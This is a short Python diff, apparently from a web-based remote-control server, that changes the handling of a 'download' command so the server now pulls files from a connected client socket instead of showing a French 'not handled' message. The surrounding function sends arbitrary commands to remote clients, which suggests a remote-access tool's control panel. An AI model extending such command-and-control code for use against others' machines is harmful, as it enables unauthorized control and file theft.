@@ -98,7 +98,9 @@ def control_client(client_id):
         try:
             client['sock'].send(command.encode())
             if command.startswith("download"):
-                response = "[!] Commande de téléchargement lancée (non gérée côté web)"
+                receive_files(client['sock'], client['id'])
+                final_msg = client['sock'].recv(4096).decode().strip()
+                response = final_msg or "[✓ Fichiers reçus]"
             else:
                 data = client['sock'].recv(4096).decode()
                 response = data.strip()
